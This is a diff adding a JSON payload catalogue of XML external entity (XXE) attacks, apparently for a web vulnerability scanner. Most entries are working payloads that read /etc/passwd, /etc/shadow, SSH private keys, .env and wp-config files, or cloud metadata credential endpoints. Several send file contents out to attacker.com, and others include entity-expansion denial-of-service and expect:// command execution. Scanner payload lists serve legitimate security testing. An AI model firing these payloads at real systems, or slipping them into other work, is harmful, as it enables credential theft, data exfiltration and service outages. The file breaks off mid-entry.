@@ -1,0 +1,820 @@
+{
+  "version": "5.1.0",
+  "category": "xxe",
+  "payloads": [
+    {
+      "id": "xxe.file.unix_passwd",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>",
+      "description": "Classic in-band XXE reading /etc/passwd.",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "owasp": "A05:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "expected_evidence": [
+        "root:x:0:0:"
+      ],
+      "references": [
+        "https://portswigger.net/web-security/xxe"
+      ],
+      "tags": [
+        "passwd"
+      ]
+    },
+    {
+      "id": "xxe.file.windows_win_ini",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><r>&xxe;</r>",
+      "description": "In-band XXE reading win.ini on Windows.",
+      "context": "file_read_windows",
+      "cwe": "CWE-611",
+      "owasp": "A05:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "expected_evidence": [
+        "[fonts]"
+      ],
+      "tags": [
+        "win.ini"
+      ]
+    },
+    {
+      "id": "xxe.php.filter_b64",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><r>&xxe;</r>",
+      "description": "XXE + php://filter to exfiltrate source that would otherwise break XML.",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "owasp": "A05:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "engines": [
+        "php"
+      ],
+      "tags": [
+        "php-filter"
+      ]
+    },
+    {
+      "id": "xxe.oob.parameter_entity",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % ext SYSTEM \"http://WSSc4n4ry7788.evil-webscanner-test.invalid/x.dtd\"> %ext;]><r>x</r>",
+      "description": "Out-of-band XXE via external parameter entity to a marker host.",
+      "context": "oob",
+      "cwe": "CWE-611",
+      "owasp": "A05:2021",
+      "canary": "evil-webscanner-test.invalid",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "oob": true,
+      "tags": [
+        "oob",
+        "parameter-entity"
+      ]
+    },
+    {
+      "id": "xxe.oob.svg_wrapped",
+      "vector": "<svg xmlns=\"http://www.w3.org/2000/svg\"><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><text>&xxe;</text></svg>",
+      "description": "XXE inside an SVG upload/preview path.",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "owasp": "A05:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "svg"
+      ]
+    },
+    {
+      "id": "xxe.xinclude.passwd",
+      "vector": "<r xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></r>",
+      "description": "XInclude for endpoints that parse a fragment (no DOCTYPE needed).",
+      "context": "xinclude",
+      "cwe": "CWE-611",
+      "owasp": "A05:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "expected_evidence": [
+        "root:x:0:0:"
+      ],
+      "tags": [
+        "xinclude"
+      ]
+    },
+    {
+      "id": "xxe.dos.billion_laughs",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><lolz>&lol3;</lolz>",
+      "description": "Entity-expansion DoS probe (kept small: 3 levels). Loud — high intrusion.",
+      "context": "dos",
+      "cwe": "CWE-776",
+      "owasp": "A05:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "min_intrusion_level": "high",
+      "tags": [
+        "dos",
+        "entity-expansion"
+      ]
+    },
+    {
+      "id": "xxe.legacy.0943b529f7",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///root/.ssh/id_rsa\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.0a5894ee74",
+      "vector": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY bar SYSTEM \"file:///etc/issue\" >]><foo>&bar;</foo>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.1042929d52",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///.env\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.12862f79b8",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///config/database.yml\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.162b2f5a60",
+      "vector": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY bar SYSTEM \"file:///etc/hosts\" >]><foo>&bar;</foo>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.180be831c3",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><root>&test;</root>",
+      "description": "Imported from the legacy corpus (file_read_windows).",
+      "context": "file_read_windows",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.21bbd3a120",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///var/log/nginx/access.log\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.259abf6ce7",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/nginx/nginx.conf\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.2628452321",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///c:/inetpub/wwwroot/web.config\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_windows).",
+      "context": "file_read_windows",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.2640071ef9",
+      "vector": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"dict://attacker.com:11211/stat\">]><foo>&xxe;</foo>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.2a40f939ef",
+      "vector": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///dev/random\" >]><foo>&xxe;</foo>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.2d430e5b0f",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///c:/windows/system32/config/sam\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_windows).",
+      "context": "file_read_windows",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.31213d4c10",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\">]><root>&xxe;</root>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.3337dae7be",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"data://text/plain;base64,PGh0bWw+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PjwvaHRtbD4=\">]><foo>&xxe;</foo>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.3910dbbb11",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///wp-config.php\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.3a4e1e549c",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///proc/self/environ\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.3aa98ea903",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.3fa5b3a5f7",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY a0 \"dos\" ><!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\" ><!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\" ><!ENTITY a3 \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\" ><!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\" >]><data>&a4;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.400e461729",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/apache2/apache2.conf\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.412ba7948a",
+      "vector": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY bar SYSTEM \"file:///etc/resolv.conf\" >]><foo>&bar;</foo>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.494ca9fe58",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///proc/cmdline\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.4994165388",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///var/log/apache2/error.log\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.545967eb07",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data SYSTEM \"http://attacker.com/evil.dtd\"><data>&send;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.58db509be4",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///usr/local/apache2/conf/httpd.conf\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.591607784c",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/user-data\">]><foo>&xxe;</foo>",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "xxe.legacy.5a7fd4614c",
+      "vector": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"jar:file:///path/to/file.jar!/resource\">]><foo>&xxe;</foo>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.5f34b23296",
+      "vector": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"gopher://attacker.com:70/xssss\">]><foo>&xxe;</foo>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.6dbc5b40a7",
+      "vector": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.6fd8a28c62",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///var/www/html/index.php\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.71f2af8958",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///var/www/html/wp-config.php\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.76ed8eba92",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]><foo>&xxe;</foo>",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "xxe.legacy.7f37997b7c",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_windows).",
+      "context": "file_read_windows",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.8250a74847",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "xxe.legacy.841740053d",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\"><!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\"><!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\"><!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\"><!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\"><!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">]><lolz>&lol9;</lolz>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.84e0a30f7c",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///home/user/.ssh/id_rsa\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.86c5b09779",
+      "vector": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><stockCheck><productId>&xxe;</productId></stockCheck>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.8b0f28845d",
+      "vector": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>\">%eval;%exfiltrate;]><foo>data</foo>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "xxe.legacy.8b96ea9254",
+      "vector": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd; %all; %send;]><foo>&send;</foo>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.8d94eb9c1a",
+      "vector": "<!DOCTYPE root [<!ENTITY % ext SYSTEM \"file:///etc/passwd\">]%ext;",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy",
+        "source:master"
+      ]
+    },
+    {
+      "id": "xxe.legacy.952efb5bb9",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///var/log/nginx/error.log\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.9aab435ee0",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///root/.bash_history\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.9df5058ce8",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"http://attacker.com/evil.dtd\"><foo>&e1;</foo>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.a980d3f49a",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.aa457be615",
+      "vector": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> <!ENTITY callhome SYSTEM \"www.attacker.com/?%xxe;\">]><foo>&callhome;</foo>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.ad8595425b",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/hostname\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.be06bb7301",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///var/log/apache2/access.log\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.be27711a8a",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///c:/boot.ini\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_windows).",
+      "context": "file_read_windows",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.c511444a75",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><foo>&send;</foo>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.cd63721352",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\">]><foo>&xxe;</foo>",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "xxe.legacy.ce93265807",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///var/www/html/.env\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.d2edff0762",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/\">]><foo>&xxe;</foo>",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "xxe.legacy.d773c4470a",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/mysql/my.cnf\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.de8b2e2fdf",
+      "vector": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.e99a4c78b0",
+      "vector": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"netdoc:file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.ec086e2ad4",
+      "vector": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>",
+      "description": "Imported from the legacy corpus (file_read_windows).",
+      "context": "file_read_windows",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.f3a7f52c2a",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///proc/version\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
